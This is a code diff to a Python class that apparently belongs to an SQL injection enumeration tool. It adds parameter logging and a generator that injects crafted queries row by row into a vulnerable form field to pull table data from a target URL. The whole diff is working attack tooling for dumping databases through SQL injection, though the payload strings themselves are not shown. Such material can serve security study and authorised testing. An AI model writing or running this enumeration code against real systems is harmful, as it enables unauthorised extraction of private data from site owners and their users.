@@ -86,6 +86,21 @@ class MYSQLENUM():
                     "table_count" : self.num_tables_pl}
         
         self.DB = {}
+
+
+    def get_params(self):
+        
+        params = {}
+        
+        params['url'] = self.target_url
+        params['data'] = self.data
+        params['request_type'] = self.request_type
+        params['vuln_field'] = self.vuln_field
+        params['limit'] = self.table_limit
+        params['terminator'] = self.terminator
+        params['debug'] = self.debug
+        
+        return params
         
 
     def get_fd(self):
@@ -137,7 +152,7 @@ class MYSQLENUM():
         
         self.DB['date'] = str(datetime.datetime.now())
         
-        self.DB['url'] = self.target_url
+        self.DB['params'] = self.get_params()
         
         self.DB['info'] = self.get_info()
             
@@ -175,11 +190,13 @@ class MYSQLENUM():
         
         enum_logger.info("Enumerating table names")
         
+        total_tables = self.DB['info']['table_count']
+        
         if not self.debug:
             
-            print(clr.yellow("\n'{}' tables found, Enumerating columns ...\n".format(clr.red(self.DB['info']['table_count']))))
+            print(clr.yellow("\n'{}' tables found, Enumerating columns ...\n".format(clr.red(total_tables))))
             
-        prog_bar = trange(int(self.DB['info']['table_count']))
+        prog_bar = trange(int(total_tables))
         
         table_dict = {}
         
@@ -187,7 +204,7 @@ class MYSQLENUM():
             '''Using jsonstreams to write the enumerated information to a json file as it is retreived from the target_url through SQL injection. This is done so that in the event of a crash or connection reset/timeout, whatever was retreived is not lost.'''
             
             s.write('date',self.DB['date'])
-            s.write('url',self.DB['url'])
+            s.write('params', self.DB['params'])
             s.write('info',self.DB['info'])
             
             with s.subobject('tables') as t:
@@ -273,7 +290,34 @@ class MYSQLENUM():
             
         return row_list
 
-             
+    def generate_rows(self, col_name, table_name, limit=None):
+        '''A generator for enumerating rows for a particular column in a table'''
+        
+        row_list = []
+        
+        if limit:
+
+            prog_bar = trange(limit)
+            
+        else:
+            
+            prog_bar = trange(int(self.DB['tables'][table_name]['row_count']))
+            
+        
+        for i in prog_bar:
+            
+            live_enum_pl = self.sqli.replace(self.payload_delimiter,self.enum_rows_pl.format(table_name=table_name, col_name=col_name)+self.limits.replace("~num~",str(i)))
+            
+            self.data[self.vuln_field] = live_enum_pl
+
+            row = self.send_sqli()
+            
+            prog_bar.set_description("Enumerated row data: '{}'".format(clr.red(row)))
+            
+            row_list.append(row)
+            
+            yield row
+                         
     def send_sqli(self):
         '''Send the SQL query+payload to be executed on the target via SQL injection'''
         
